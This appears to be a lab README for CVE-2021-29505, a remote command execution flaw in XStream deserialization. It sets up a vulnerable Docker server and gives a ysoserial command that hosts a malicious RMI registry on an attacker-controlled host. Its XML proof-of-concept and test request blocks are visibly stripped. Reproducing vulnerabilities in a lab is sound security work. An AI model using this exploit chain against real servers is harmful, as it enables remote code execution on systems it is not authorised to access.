# XStream Deserialization Remote Command Execution (CVE-2021-29505)
[中文版本(Chinese version)](README.zh-cn.md)
XStream is a simple library to serialize objects to XML and back again.
XStream uses a blocklist mechanism when parsing XML text which is utilized to defend against deserialization vulnerabilities, but in 1.4.16 and earlier, blocklists are incomplete and attackers could use `sun.rmi.registry.RegistryImpl_Stub` to make an RMI request and execute arbitrary commands finally.

## Vulnerable Environment
Start a Springboot + XStream 1.4.16 server.
```
docker compose up -d
```
Once the environment is started, you can send the following request to `http://your-ip:8080` to test if the server has started successfully

## POC
First of all, you have to start a malicious RMI Registry on evil server using the JRMPListener of [ysoserial](https://github.com/frohoff/ysoserial).
```
java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "touch /tmp/success"
```
This RMI Registry, upon receiving the request, returns a malicious serialized object constructed with `CommonsCollections6` gadget.
Then, send the XML POC of CVE-2021-29505, replace **evil-ip** with address of evil RMI Registry.
```

                                        1099
```
The malicious RMI registry receives the RMI request successfully.

Enter into the XStream container, ``touch /tmp/success`` has been successfully executed:

Significantly, POC from [official website][1] is wrong, you must not use it.
